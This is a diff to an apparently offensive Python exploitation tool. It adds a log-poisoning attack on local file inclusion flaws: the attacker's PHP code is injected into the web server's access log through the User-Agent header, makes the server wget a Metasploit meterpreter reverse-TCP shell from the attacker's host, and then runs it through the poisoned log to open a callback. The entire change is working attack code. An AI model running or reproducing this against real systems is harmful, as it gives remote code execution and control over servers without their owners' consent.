@@ -190,13 +190,69 @@ class Expect:
         print(t.green(" [*] ") + "Downloading Shell")
         progressbar()
 
-        ir = requests.get(lfi)
-
         try:
-            if ir.status_code != 200:
+            r = requests.get(lfi)
+            if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
             else:
                 handle = Payload(lhost, lport, self.target, shell)
                 handle.handler()
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ") (expect_error)
+
+
+class Logs:
+
+    def __init__(self, target, location):
+
+        self.target = target
+        self.location = location  # /var/log/apache2/access.log
+
+    def execute_logs(self):
+
+        # Arguments for Meterpreter
+        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
+        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
+
+        # Generate random shell name
+        g = Generator()
+        shell = g.generate()
+
+        payload = "<? system('wget http://{0}:8000/{1}.php') ?>".format(lhost, shell)
+        lfi = self.target + self.location
+
+        print(t.green(" [*] ") + "Generating Payload")
+        progressbar()
+        print(t.red(" [!] ") + "Success!")
+        print(t.green(" [*] ") + "Generating Metasploit Payload")
+        progressbar()
+
+        # Generate PHP shell
+        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
+        msf = subprocess.Popen(php, shell=True)
+        msf.wait()
+
+        # Handle Metasploit error codes
+        if msf.returncode != 0:
+            print(t.red(" [!] Error Generating MSF Payload "))
+        else:
+            print(t.green(" [*] ") + "Success!")
+
+        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+        print(t.green(" [*] ") + "Downloading Shell")
+        progressbar()
+
+        try:
+            headers = {'User-Agent': payload}
+            r = requests.get(lfi, headers=headers)
+            if r.status_code != 200:
+                print(t.red(" [!] Unexpected HTTP Response "))
+            else:
+                r = requests.get(lfi)  # pull down shell from poisoned logs
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+                else:
+                    handle = Payload(lhost, lport, self.target, shell)
+                    handle.handler()
+        except requests.exceptions.RequestException as expect_error:
+            print t.red(" [!] HTTP Error ")(expect_error)
